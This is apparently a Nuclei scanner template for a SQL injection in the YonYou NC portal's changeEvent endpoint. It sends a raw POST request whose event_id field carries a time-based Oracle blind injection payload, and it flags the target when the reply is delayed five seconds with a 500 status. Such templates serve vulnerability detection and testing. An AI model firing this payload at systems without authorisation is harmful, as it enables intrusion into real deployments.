id: YonYouNC-changeEvent-sqlInjection

info:
  name: YonYouNC-changeEvent-sqlInjection
  author: iSee857
  severity: high
  description: YonYouNC-changeEvent-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
        Host: {{Host}}
        Content-type:application/x-www-form-urlencoded

        event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 500